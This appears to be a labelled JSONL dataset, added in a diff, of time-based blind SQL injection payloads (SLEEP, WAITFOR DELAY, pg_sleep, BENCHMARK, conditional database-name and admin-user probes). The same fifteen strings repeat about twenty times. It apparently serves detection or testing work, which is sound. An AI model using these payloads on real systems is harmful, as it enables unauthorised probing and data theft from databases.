@@ -1,0 +1,300 @@
+{"payload": "' AND SLEEP(5)--", "attack_type": "SQLI"}
+{"payload": "' OR SLEEP(5)--", "attack_type": "SQLI"}
+{"payload": "'; WAITFOR DELAY '0:0:5'--", "attack_type": "SQLI"}
+{"payload": "' AND IF(1=1, SLEEP(5), 0)--", "attack_type": "SQLI"}
+{"payload": "' AND IF(1=2, SLEEP(5), 0)--", "attack_type": "SQLI"}
+{"payload": "' OR IF(1=1, SLEEP(5), 0)--", "attack_type": "SQLI"}
+{"payload": "' OR IF(1=2, SLEEP(5), 0)--", "attack_type": "SQLI"}
+{"payload": "' AND BENCHMARK(5000000,MD5('test'))--", "attack_type": "SQLI"}
+{"payload": "' OR BENCHMARK(5000000,MD5('test'))--", "attack_type": "SQLI"}
+{"payload": "' AND pg_sleep(5)--", "attack_type": "SQLI"}
+{"payload": "'; SELECT pg_sleep(5)--", "attack_type": "SQLI"}
+{"payload": "'; WAITFOR DELAY '00:00:05'--", "attack_type": "SQLI"}
+{"payload": "' AND IF(LENGTH(DATABASE())>5, SLEEP(5), 0)--", "attack_type": "SQLI"}
+{"payload": "' AND IF(ASCII(SUBSTRING(DATABASE(),1,1))>64, SLEEP(5), 0)--", "attack_type": "SQLI"}
+{"payload": "' AND IF(EXISTS(SELECT 1 FROM users WHERE username='admin'), SLEEP(5), 0)--", "attack_type": "SQLI"}
+{"payload": "' AND SLEEP(5)--", "attack_type": "SQLI"}
+{"payload": "' OR SLEEP(5)--", "attack_type": "SQLI"}
+{"payload": "'; WAITFOR DELAY '0:0:5'--", "attack_type": "SQLI"}
+{"payload": "' AND IF(1=1, SLEEP(5), 0)--", "attack_type": "SQLI"}
+{"payload": "' AND IF(1=2, SLEEP(5), 0)--", "attack_type": "SQLI"}
+{"payload": "' OR IF(1=1, SLEEP(5), 0)--", "attack_type": "SQLI"}
+{"payload": "' OR IF(1=2, SLEEP(5), 0)--", "attack_type": "SQLI"}
+{"payload": "' AND BENCHMARK(5000000,MD5('test'))--", "attack_type": "SQLI"}
+{"payload": "' OR BENCHMARK(5000000,MD5('test'))--", "attack_type": "SQLI"}
+{"payload": "' AND pg_sleep(5)--", "attack_type": "SQLI"}
+{"payload": "'; SELECT pg_sleep(5)--", "attack_type": "SQLI"}
+{"payload": "'; WAITFOR DELAY '00:00:05'--", "attack_type": "SQLI"}
+{"payload": "' AND IF(LENGTH(DATABASE())>5, SLEEP(5), 0)--", "attack_type": "SQLI"}
+{"payload": "' AND IF(ASCII(SUBSTRING(DATABASE(),1,1))>64, SLEEP(5), 0)--", "attack_type": "SQLI"}
+{"payload": "' AND IF(EXISTS(SELECT 1 FROM users WHERE username='admin'), SLEEP(5), 0)--", "attack_type": "SQLI"}
+{"payload": "' AND SLEEP(5)--", "attack_type": "SQLI"}
+{"payload": "' OR SLEEP(5)--", "attack_type": "SQLI"}
+{"payload": "'; WAITFOR DELAY '0:0:5'--", "attack_type": "SQLI"}
+{"payload": "' AND IF(1=1, SLEEP(5), 0)--", "attack_type": "SQLI"}
+{"payload": "' AND IF(1=2, SLEEP(5), 0)--", "attack_type": "SQLI"}
+{"payload": "' OR IF(1=1, SLEEP(5), 0)--", "attack_type": "SQLI"}
+{"payload": "' OR IF(1=2, SLEEP(5), 0)--", "attack_type": "SQLI"}
+{"payload": "' AND BENCHMARK(5000000,MD5('test'))--", "attack_type": "SQLI"}
+{"payload": "' OR BENCHMARK(5000000,MD5('test'))--", "attack_type": "SQLI"}
+{"payload": "' AND pg_sleep(5)--", "attack_type": "SQLI"}
+{"payload": "'; SELECT pg_sleep(5)--", "attack_type": "SQLI"}
+{"payload": "'; WAITFOR DELAY '00:00:05'--", "attack_type": "SQLI"}
+{"payload": "' AND IF(LENGTH(DATABASE())>5, SLEEP(5), 0)--", "attack_type": "SQLI"}
+{"payload": "' AND IF(ASCII(SUBSTRING(DATABASE(),1,1))>64, SLEEP(5), 0)--", "attack_type": "SQLI"}
+{"payload": "' AND IF(EXISTS(SELECT 1 FROM users WHERE username='admin'), SLEEP(5), 0)--", "attack_type": "SQLI"}
+{"payload": "' AND SLEEP(5)--", "attack_type": "SQLI"}
+{"payload": "' OR SLEEP(5)--", "attack_type": "SQLI"}
+{"payload": "'; WAITFOR DELAY '0:0:5'--", "attack_type": "SQLI"}
+{"payload": "' AND IF(1=1, SLEEP(5), 0)--", "attack_type": "SQLI"}
+{"payload": "' AND IF(1=2, SLEEP(5), 0)--", "attack_type": "SQLI"}
+{"payload": "' OR IF(1=1, SLEEP(5), 0)--", "attack_type": "SQLI"}
+{"payload": "' OR IF(1=2, SLEEP(5), 0)--", "attack_type": "SQLI"}
+{"payload": "' AND BENCHMARK(5000000,MD5('test'))--", "attack_type": "SQLI"}
+{"payload": "' OR BENCHMARK(5000000,MD5('test'))--", "attack_type": "SQLI"}
+{"payload": "' AND pg_sleep(5)--", "attack_type": "SQLI"}
+{"payload": "'; SELECT pg_sleep(5)--", "attack_type": "SQLI"}
+{"payload": "'; WAITFOR DELAY '00:00:05'--", "attack_type": "SQLI"}
+{"payload": "' AND IF(LENGTH(DATABASE())>5, SLEEP(5), 0)--", "attack_type": "SQLI"}
+{"payload": "' AND IF(ASCII(SUBSTRING(DATABASE(),1,1))>64, SLEEP(5), 0)--", "attack_type": "SQLI"}
+{"payload": "' AND IF(EXISTS(SELECT 1 FROM users WHERE username='admin'), SLEEP(5), 0)--", "attack_type": "SQLI"}
+{"payload": "' AND SLEEP(5)--", "attack_type": "SQLI"}
+{"payload": "' OR SLEEP(5)--", "attack_type": "SQLI"}
+{"payload": "'; WAITFOR DELAY '0:0:5'--", "attack_type": "SQLI"}
+{"payload": "' AND IF(1=1, SLEEP(5), 0)--", "attack_type": "SQLI"}
+{"payload": "' AND IF(1=2, SLEEP(5), 0)--", "attack_type": "SQLI"}
+{"payload": "' OR IF(1=1, SLEEP(5), 0)--", "attack_type": "SQLI"}
+{"payload": "' OR IF(1=2, SLEEP(5), 0)--", "attack_type": "SQLI"}
+{"payload": "' AND BENCHMARK(5000000,MD5('test'))--", "attack_type": "SQLI"}
+{"payload": "' OR BENCHMARK(5000000,MD5('test'))--", "attack_type": "SQLI"}
+{"payload": "' AND pg_sleep(5)--", "attack_type": "SQLI"}
+{"payload": "'; SELECT pg_sleep(5)--", "attack_type": "SQLI"}
+{"payload": "'; WAITFOR DELAY '00:00:05'--", "attack_type": "SQLI"}
+{"payload": "' AND IF(LENGTH(DATABASE())>5, SLEEP(5), 0)--", "attack_type": "SQLI"}
+{"payload": "' AND IF(ASCII(SUBSTRING(DATABASE(),1,1))>64, SLEEP(5), 0)--", "attack_type": "SQLI"}
+{"payload": "' AND IF(EXISTS(SELECT 1 FROM users WHERE username='admin'), SLEEP(5), 0)--", "attack_type": "SQLI"}
+{"payload": "' AND SLEEP(5)--", "attack_type": "SQLI"}
+{"payload": "' OR SLEEP(5)--", "attack_type": "SQLI"}
+{"payload": "'; WAITFOR DELAY '0:0:5'--", "attack_type": "SQLI"}
+{"payload": "' AND IF(1=1, SLEEP(5), 0)--", "attack_type": "SQLI"}
+{"payload": "' AND IF(1=2, SLEEP(5), 0)--", "attack_type": "SQLI"}
+{"payload": "' OR IF(1=1, SLEEP(5), 0)--", "attack_type": "SQLI"}
+{"payload": "' OR IF(1=2, SLEEP(5), 0)--", "attack_type": "SQLI"}
+{"payload": "' AND BENCHMARK(5000000,MD5('test'))--", "attack_type": "SQLI"}
+{"payload": "' OR BENCHMARK(5000000,MD5('test'))--", "attack_type": "SQLI"}
+{"payload": "' AND pg_sleep(5)--", "attack_type": "SQLI"}
+{"payload": "'; SELECT pg_sleep(5)--", "attack_type": "SQLI"}
+{"payload": "'; WAITFOR DELAY '00:00:05'--", "attack_type": "SQLI"}
+{"payload": "' AND IF(LENGTH(DATABASE())>5, SLEEP(5), 0)--", "attack_type": "SQLI"}
+{"payload": "' AND IF(ASCII(SUBSTRING(DATABASE(),1,1))>64, SLEEP(5), 0)--", "attack_type": "SQLI"}
+{"payload": "' AND IF(EXISTS(SELECT 1 FROM users WHERE username='admin'), SLEEP(5), 0)--", "attack_type": "SQLI"}
+{"payload": "' AND SLEEP(5)--", "attack_type": "SQLI"}
+{"payload": "' OR SLEEP(5)--", "attack_type": "SQLI"}
+{"payload": "'; WAITFOR DELAY '0:0:5'--", "attack_type": "SQLI"}
+{"payload": "' AND IF(1=1, SLEEP(5), 0)--", "attack_type": "SQLI"}
+{"payload": "' AND IF(1=2, SLEEP(5), 0)--", "attack_type": "SQLI"}
+{"payload": "' OR IF(1=1, SLEEP(5), 0)--", "attack_type": "SQLI"}
+{"payload": "' OR IF(1=2, SLEEP(5), 0)--", "attack_type": "SQLI"}
+{"payload": "' AND BENCHMARK(5000000,MD5('test'))--", "attack_type": "SQLI"}
+{"payload": "' OR BENCHMARK(5000000,MD5('test'))--", "attack_type": "SQLI"}
+{"payload": "' AND pg_sleep(5)--", "attack_type": "SQLI"}
+{"payload": "'; SELECT pg_sleep(5)--", "attack_type": "SQLI"}
+{"payload": "'; WAITFOR DELAY '00:00:05'--", "attack_type": "SQLI"}
+{"payload": "' AND IF(LENGTH(DATABASE())>5, SLEEP(5), 0)--", "attack_type": "SQLI"}
+{"payload": "' AND IF(ASCII(SUBSTRING(DATABASE(),1,1))>64, SLEEP(5), 0)--", "attack_type": "SQLI"}
+{"payload": "' AND IF(EXISTS(SELECT 1 FROM users WHERE username='admin'), SLEEP(5), 0)--", "attack_type": "SQLI"}
+{"payload": "' AND SLEEP(5)--", "attack_type": "SQLI"}
+{"payload": "' OR SLEEP(5)--", "attack_type": "SQLI"}
+{"payload": "'; WAITFOR DELAY '0:0:5'--", "attack_type": "SQLI"}
+{"payload": "' AND IF(1=1, SLEEP(5), 0)--", "attack_type": "SQLI"}
+{"payload": "' AND IF(1=2, SLEEP(5), 0)--", "attack_type": "SQLI"}
+{"payload": "' OR IF(1=1, SLEEP(5), 0)--", "attack_type": "SQLI"}
+{"payload": "' OR IF(1=2, SLEEP(5), 0)--", "attack_type": "SQLI"}
+{"payload": "' AND BENCHMARK(5000000,MD5('test'))--", "attack_type": "SQLI"}
+{"payload": "' OR BENCHMARK(5000000,MD5('test'))--", "attack_type": "SQLI"}
+{"payload": "' AND pg_sleep(5)--", "attack_type": "SQLI"}
+{"payload": "'; SELECT pg_sleep(5)--", "attack_type": "SQLI"}
+{"payload": "'; WAITFOR DELAY '00:00:05'--", "attack_type": "SQLI"}
+{"payload": "' AND IF(LENGTH(DATABASE())>5, SLEEP(5), 0)--", "attack_type": "SQLI"}
+{"payload": "' AND IF(ASCII(SUBSTRING(DATABASE(),1,1))>64, SLEEP(5), 0)--", "attack_type": "SQLI"}
+{"payload": "' AND IF(EXISTS(SELECT 1 FROM users WHERE username='admin'), SLEEP(5), 0)--", "attack_type": "SQLI"}
+{"payload": "' AND SLEEP(5)--", "attack_type": "SQLI"}
+{"payload": "' OR SLEEP(5)--", "attack_type": "SQLI"}
+{"payload": "'; WAITFOR DELAY '0:0:5'--", "attack_type": "SQLI"}
+{"payload": "' AND IF(1=1, SLEEP(5), 0)--", "attack_type": "SQLI"}
+{"payload": "' AND IF(1=2, SLEEP(5), 0)--", "attack_type": "SQLI"}
+{"payload": "' OR IF(1=1, SLEEP(5), 0)--", "attack_type": "SQLI"}
+{"payload": "' OR IF(1=2, SLEEP(5), 0)--", "attack_type": "SQLI"}
+{"payload": "' AND BENCHMARK(5000000,MD5('test'))--", "attack_type": "SQLI"}
+{"payload": "' OR BENCHMARK(5000000,MD5('test'))--", "attack_type": "SQLI"}
+{"payload": "' AND pg_sleep(5)--", "attack_type": "SQLI"}
+{"payload": "'; SELECT pg_sleep(5)--", "attack_type": "SQLI"}
+{"payload": "'; WAITFOR DELAY '00:00:05'--", "attack_type": "SQLI"}
+{"payload": "' AND IF(LENGTH(DATABASE())>5, SLEEP(5), 0)--", "attack_type": "SQLI"}
+{"payload": "' AND IF(ASCII(SUBSTRING(DATABASE(),1,1))>64, SLEEP(5), 0)--", "attack_type": "SQLI"}
+{"payload": "' AND IF(EXISTS(SELECT 1 FROM users WHERE username='admin'), SLEEP(5), 0)--", "attack_type": "SQLI"}
+{"payload": "' AND SLEEP(5)--", "attack_type": "SQLI"}
+{"payload": "' OR SLEEP(5)--", "attack_type": "SQLI"}
+{"payload": "'; WAITFOR DELAY '0:0:5'--", "attack_type": "SQLI"}
+{"payload": "' AND IF(1=1, SLEEP(5), 0)--", "attack_type": "SQLI"}
+{"payload": "' AND IF(1=2, SLEEP(5), 0)--", "attack_type": "SQLI"}
+{"payload": "' OR IF(1=1, SLEEP(5), 0)--", "attack_type": "SQLI"}
+{"payload": "' OR IF(1=2, SLEEP(5), 0)--", "attack_type": "SQLI"}
+{"payload": "' AND BENCHMARK(5000000,MD5('test'))--", "attack_type": "SQLI"}
+{"payload": "' OR BENCHMARK(5000000,MD5('test'))--", "attack_type": "SQLI"}
+{"payload": "' AND pg_sleep(5)--", "attack_type": "SQLI"}
+{"payload": "'; SELECT pg_sleep(5)--", "attack_type": "SQLI"}
+{"payload": "'; WAITFOR DELAY '00:00:05'--", "attack_type": "SQLI"}
+{"payload": "' AND IF(LENGTH(DATABASE())>5, SLEEP(5), 0)--", "attack_type": "SQLI"}
+{"payload": "' AND IF(ASCII(SUBSTRING(DATABASE(),1,1))>64, SLEEP(5), 0)--", "attack_type": "SQLI"}
+{"payload": "' AND IF(EXISTS(SELECT 1 FROM users WHERE username='admin'), SLEEP(5), 0)--", "attack_type": "SQLI"}
+{"payload": "' AND SLEEP(5)--", "attack_type": "SQLI"}
+{"payload": "' OR SLEEP(5)--", "attack_type": "SQLI"}
+{"payload": "'; WAITFOR DELAY '0:0:5'--", "attack_type": "SQLI"}
+{"payload": "' AND IF(1=1, SLEEP(5), 0)--", "attack_type": "SQLI"}
+{"payload": "' AND IF(1=2, SLEEP(5), 0)--", "attack_type": "SQLI"}
+{"payload": "' OR IF(1=1, SLEEP(5), 0)--", "attack_type": "SQLI"}
+{"payload": "' OR IF(1=2, SLEEP(5), 0)--", "attack_type": "SQLI"}
+{"payload": "' AND BENCHMARK(5000000,MD5('test'))--", "attack_type": "SQLI"}
+{"payload": "' OR BENCHMARK(5000000,MD5('test'))--", "attack_type": "SQLI"}
+{"payload": "' AND pg_sleep(5)--", "attack_type": "SQLI"}
+{"payload": "'; SELECT pg_sleep(5)--", "attack_type": "SQLI"}
+{"payload": "'; WAITFOR DELAY '00:00:05'--", "attack_type": "SQLI"}
+{"payload": "' AND IF(LENGTH(DATABASE())>5, SLEEP(5), 0)--", "attack_type": "SQLI"}
+{"payload": "' AND IF(ASCII(SUBSTRING(DATABASE(),1,1))>64, SLEEP(5), 0)--", "attack_type": "SQLI"}
+{"payload": "' AND IF(EXISTS(SELECT 1 FROM users WHERE username='admin'), SLEEP(5), 0)--", "attack_type": "SQLI"}
+{"payload": "' AND SLEEP(5)--", "attack_type": "SQLI"}
+{"payload": "' OR SLEEP(5)--", "attack_type": "SQLI"}
+{"payload": "'; WAITFOR DELAY '0:0:5'--", "attack_type": "SQLI"}
+{"payload": "' AND IF(1=1, SLEEP(5), 0)--", "attack_type": "SQLI"}
+{"payload": "' AND IF(1=2, SLEEP(5), 0)--", "attack_type": "SQLI"}
+{"payload": "' OR IF(1=1, SLEEP(5), 0)--", "attack_type": "SQLI"}
+{"payload": "' OR IF(1=2, SLEEP(5), 0)--", "attack_type": "SQLI"}
+{"payload": "' AND BENCHMARK(5000000,MD5('test'))--", "attack_type": "SQLI"}
+{"payload": "' OR BENCHMARK(5000000,MD5('test'))--", "attack_type": "SQLI"}
+{"payload": "' AND pg_sleep(5)--", "attack_type": "SQLI"}
+{"payload": "'; SELECT pg_sleep(5)--", "attack_type": "SQLI"}
+{"payload": "'; WAITFOR DELAY '00:00:05'--", "attack_type": "SQLI"}
+{"payload": "' AND IF(LENGTH(DATABASE())>5, SLEEP(5), 0)--", "attack_type": "SQLI"}
+{"payload": "' AND IF(ASCII(SUBSTRING(DATABASE(),1,1))>64, SLEEP(5), 0)--", "attack_type": "SQLI"}
+{"payload": "' AND IF(EXISTS(SELECT 1 FROM users WHERE username='admin'), SLEEP(5), 0)--", "attack_type": "SQLI"}
+{"payload": "' AND SLEEP(5)--", "attack_type": "SQLI"}
+{"payload": "' OR SLEEP(5)--", "attack_type": "SQLI"}
+{"payload": "'; WAITFOR DELAY '0:0:5'--", "attack_type": "SQLI"}
+{"payload": "' AND IF(1=1, SLEEP(5), 0)--", "attack_type": "SQLI"}
+{"payload": "' AND IF(1=2, SLEEP(5), 0)--", "attack_type": "SQLI"}
+{"payload": "' OR IF(1=1, SLEEP(5), 0)--", "attack_type": "SQLI"}
+{"payload": "' OR IF(1=2, SLEEP(5), 0)--", "attack_type": "SQLI"}
+{"payload": "' AND BENCHMARK(5000000,MD5('test'))--", "attack_type": "SQLI"}
+{"payload": "' OR BENCHMARK(5000000,MD5('test'))--", "attack_type": "SQLI"}
+{"payload": "' AND pg_sleep(5)--", "attack_type": "SQLI"}
+{"payload": "'; SELECT pg_sleep(5)--", "attack_type": "SQLI"}
+{"payload": "'; WAITFOR DELAY '00:00:05'--", "attack_type": "SQLI"}
+{"payload": "' AND IF(LENGTH(DATABASE())>5, SLEEP(5), 0)--", "attack_type": "SQLI"}
+{"payload": "' AND IF(ASCII(SUBSTRING(DATABASE(),1,1))>64, SLEEP(5), 0)--", "attack_type": "SQLI"}
+{"payload": "' AND IF(EXISTS(SELECT 1 FROM users WHERE username='admin'), SLEEP(5), 0)--", "attack_type": "SQLI"}
+{"payload": "' AND SLEEP(5)--", "attack_type": "SQLI"}
+{"payload": "' OR SLEEP(5)--", "attack_type": "SQLI"}
+{"payload": "'; WAITFOR DELAY '0:0:5'--", "attack_type": "SQLI"}
+{"payload": "' AND IF(1=1, SLEEP(5), 0)--", "attack_type": "SQLI"}
+{"payload": "' AND IF(1=2, SLEEP(5), 0)--", "attack_type": "SQLI"}
+{"payload": "' OR IF(1=1, SLEEP(5), 0)--", "attack_type": "SQLI"}
+{"payload": "' OR IF(1=2, SLEEP(5), 0)--", "attack_type": "SQLI"}
+{"payload": "' AND BENCHMARK(5000000,MD5('test'))--", "attack_type": "SQLI"}
+{"payload": "' OR BENCHMARK(5000000,MD5('test'))--", "attack_type": "SQLI"}
+{"payload": "' AND pg_sleep(5)--", "attack_type": "SQLI"}
+{"payload": "'; SELECT pg_sleep(5)--", "attack_type": "SQLI"}
+{"payload": "'; WAITFOR DELAY '00:00:05'--", "attack_type": "SQLI"}
+{"payload": "' AND IF(LENGTH(DATABASE())>5, SLEEP(5), 0)--", "attack_type": "SQLI"}
+{"payload": "' AND IF(ASCII(SUBSTRING(DATABASE(),1,1))>64, SLEEP(5), 0)--", "attack_type": "SQLI"}
+{"payload": "' AND IF(EXISTS(SELECT 1 FROM users WHERE username='admin'), SLEEP(5), 0)--", "attack_type": "SQLI"}
+{"payload": "' AND SLEEP(5)--", "attack_type": "SQLI"}
+{"payload": "' OR SLEEP(5)--", "attack_type": "SQLI"}
+{"payload": "'; WAITFOR DELAY '0:0:5'--", "attack_type": "SQLI"}
+{"payload": "' AND IF(1=1, SLEEP(5), 0)--", "attack_type": "SQLI"}
+{"payload": "' AND IF(1=2, SLEEP(5), 0)--", "attack_type": "SQLI"}
+{"payload": "' OR IF(1=1, SLEEP(5), 0)--", "attack_type": "SQLI"}
+{"payload": "' OR IF(1=2, SLEEP(5), 0)--", "attack_type": "SQLI"}
+{"payload": "' AND BENCHMARK(5000000,MD5('test'))--", "attack_type": "SQLI"}
+{"payload": "' OR BENCHMARK(5000000,MD5('test'))--", "attack_type": "SQLI"}
+{"payload": "' AND pg_sleep(5)--", "attack_type": "SQLI"}
+{"payload": "'; SELECT pg_sleep(5)--", "attack_type": "SQLI"}
+{"payload": "'; WAITFOR DELAY '00:00:05'--", "attack_type": "SQLI"}
+{"payload": "' AND IF(LENGTH(DATABASE())>5, SLEEP(5), 0)--", "attack_type": "SQLI"}
+{"payload": "' AND IF(ASCII(SUBSTRING(DATABASE(),1,1))>64, SLEEP(5), 0)--", "attack_type": "SQLI"}
+{"payload": "' AND IF(EXISTS(SELECT 1 FROM users WHERE username='admin'), SLEEP(5), 0)--", "attack_type": "SQLI"}
+{"payload": "' AND SLEEP(5)--", "attack_type": "SQLI"}
+{"payload": "' OR SLEEP(5)--", "attack_type": "SQLI"}
+{"payload": "'; WAITFOR DELAY '0:0:5'--", "attack_type": "SQLI"}
+{"payload": "' AND IF(1=1, SLEEP(5), 0)--", "attack_type": "SQLI"}
+{"payload": "' AND IF(1=2, SLEEP(5), 0)--", "attack_type": "SQLI"}
+{"payload": "' OR IF(1=1, SLEEP(5), 0)--", "attack_type": "SQLI"}
+{"payload": "' OR IF(1=2, SLEEP(5), 0)--", "attack_type": "SQLI"}
+{"payload": "' AND BENCHMARK(5000000,MD5('test'))--", "attack_type": "SQLI"}
+{"payload": "' OR BENCHMARK(5000000,MD5('test'))--", "attack_type": "SQLI"}
+{"payload": "' AND pg_sleep(5)--", "attack_type": "SQLI"}
+{"payload": "'; SELECT pg_sleep(5)--", "attack_type": "SQLI"}
+{"payload": "'; WAITFOR DELAY '00:00:05'--", "attack_type": "SQLI"}
+{"payload": "' AND IF(LENGTH(DATABASE())>5, SLEEP(5), 0)--", "attack_type": "SQLI"}
+{"payload": "' AND IF(ASCII(SUBSTRING(DATABASE(),1,1))>64, SLEEP(5), 0)--", "attack_type": "SQLI"}
+{"payload": "' AND IF(EXISTS(SELECT 1 FROM users WHERE username='admin'), SLEEP(5), 0)--", "attack_type": "SQLI"}
+{"payload": "' AND SLEEP(5)--", "attack_type": "SQLI"}
+{"payload": "' OR SLEEP(5)--", "attack_type": "SQLI"}
+{"payload": "'; WAITFOR DELAY '0:0:5'--", "attack_type": "SQLI"}
+{"payload": "' AND IF(1=1, SLEEP(5), 0)--", "attack_type": "SQLI"}
+{"payload": "' AND IF(1=2, SLEEP(5), 0)--", "attack_type": "SQLI"}
+{"payload": "' OR IF(1=1, SLEEP(5), 0)--", "attack_type": "SQLI"}
+{"payload": "' OR IF(1=2, SLEEP(5), 0)--", "attack_type": "SQLI"}
+{"payload": "' AND BENCHMARK(5000000,MD5('test'))--", "attack_type": "SQLI"}
+{"payload": "' OR BENCHMARK(5000000,MD5('test'))--", "attack_type": "SQLI"}
+{"payload": "' AND pg_sleep(5)--", "attack_type": "SQLI"}
+{"payload": "'; SELECT pg_sleep(5)--", "attack_type": "SQLI"}
+{"payload": "'; WAITFOR DELAY '00:00:05'--", "attack_type": "SQLI"}
+{"payload": "' AND IF(LENGTH(DATABASE())>5, SLEEP(5), 0)--", "attack_type": "SQLI"}
+{"payload": "' AND IF(ASCII(SUBSTRING(DATABASE(),1,1))>64, SLEEP(5), 0)--", "attack_type": "SQLI"}
+{"payload": "' AND IF(EXISTS(SELECT 1 FROM users WHERE username='admin'), SLEEP(5), 0)--", "attack_type": "SQLI"}
+{"payload": "' AND SLEEP(5)--", "attack_type": "SQLI"}
+{"payload": "' OR SLEEP(5)--", "attack_type": "SQLI"}
+{"payload": "'; WAITFOR DELAY '0:0:5'--", "attack_type": "SQLI"}
+{"payload": "' AND IF(1=1, SLEEP(5), 0)--", "attack_type": "SQLI"}
+{"payload": "' AND IF(1=2, SLEEP(5), 0)--", "attack_type": "SQLI"}
+{"payload": "' OR IF(1=1, SLEEP(5), 0)--", "attack_type": "SQLI"}
+{"payload": "' OR IF(1=2, SLEEP(5), 0)--", "attack_type": "SQLI"}
+{"payload": "' AND BENCHMARK(5000000,MD5('test'))--", "attack_type": "SQLI"}
+{"payload": "' OR BENCHMARK(5000000,MD5('test'))--", "attack_type": "SQLI"}
+{"payload": "' AND pg_sleep(5)--", "attack_type": "SQLI"}
+{"payload": "'; SELECT pg_sleep(5)--", "attack_type": "SQLI"}
+{"payload": "'; WAITFOR DELAY '00:00:05'--", "attack_type": "SQLI"}
+{"payload": "' AND IF(LENGTH(DATABASE())>5, SLEEP(5), 0)--", "attack_type": "SQLI"}
+{"payload": "' AND IF(ASCII(SUBSTRING(DATABASE(),1,1))>64, SLEEP(5), 0)--", "attack_type": "SQLI"}
+{"payload": "' AND IF(EXISTS(SELECT 1 FROM users WHERE username='admin'), SLEEP(5), 0)--", "attack_type": "SQLI"}
+{"payload": "' AND SLEEP(5)--", "attack_type": "SQLI"}
+{"payload": "' OR SLEEP(5)--", "attack_type": "SQLI"}
+{"payload": "'; WAITFOR DELAY '0:0:5'--", "attack_type": "SQLI"}
+{"payload": "' AND IF(1=1, SLEEP(5), 0)--", "attack_type": "SQLI"}
+{"payload": "' AND IF(1=2, SLEEP(5), 0)--", "attack_type": "SQLI"}
+{"payload": "' OR IF(1=1, SLEEP(5), 0)--", "attack_type": "SQLI"}
+{"payload": "' OR IF(1=2, SLEEP(5), 0)--", "attack_type": "SQLI"}
+{"payload": "' AND BENCHMARK(5000000,MD5('test'))--", "attack_type": "SQLI"}
+{"payload": "' OR BENCHMARK(5000000,MD5('test'))--", "attack_type": "SQLI"}
+{"payload": "' AND pg_sleep(5)--", "attack_type": "SQLI"}
+{"payload": "'; SELECT pg_sleep(5)--", "attack_type": "SQLI"}
+{"payload": "'; WAITFOR DELAY '00:00:05'--", "attack_type": "SQLI"}
+{"payload": "' AND IF(LENGTH(DATABASE())>5, SLEEP(5), 0)--", "attack_type": "SQLI"}
+{"payload": "' AND IF(ASCII(SUBSTRING(DATABASE(),1,1))>64, SLEEP(5), 0)--", "attack_type": "SQLI"}
+{"payload": "' AND IF(EXISTS(SELECT 1 FROM users WHERE username='admin'), SLEEP(5), 0)--", "attack_type": "SQLI"}
+{"payload": "' AND SLEEP(5)--", "attack_type": "SQLI"}
+{"payload": "' OR SLEEP(5)--", "attack_type": "SQLI"}
+{"payload": "'; WAITFOR DELAY '0:0:5'--", "attack_type": "SQLI"}
+{"payload": "' AND IF(1=1, SLEEP(5), 0)--", "attack_type": "SQLI"}
+{"payload": "' AND IF(1=2, SLEEP(5), 0)--", "attack_type": "SQLI"}
+{"payload": "' OR IF(1=1, SLEEP(5), 0)--", "attack_type": "SQLI"}
+{"payload": "' OR IF(1=2, SLEEP(5), 0)--", "attack_type": "SQLI"}
+{"payload": "' AND BENCHMARK(5000000,MD5('test'))--", "attack_type": "SQLI"}
+{"payload": "' OR BENCHMARK(5000000,MD5('test'))--", "attack_type": "SQLI"}
+{"payload": "' AND pg_sleep(5)--", "attack_type": "SQLI"}
+{"payload": "'; SELECT pg_sleep(5)--", "attack_type": "SQLI"}
+{"payload": "'; WAITFOR DELAY '00:00:05'--", "attack_type": "SQLI"}
+{"payload": "' AND IF(LENGTH(DATABASE())>5, SLEEP(5), 0)--", "attack_type": "SQLI"}
+{"payload": "' AND IF(ASCII(SUBSTRING(DATABASE(),1,1))>64, SLEEP(5), 0)--", "attack_type": "SQLI"}
+{"payload": "' AND IF(EXISTS(SELECT 1 FROM users WHERE username='admin'), SLEEP(5), 0)--", "attack_type": "SQLI"}
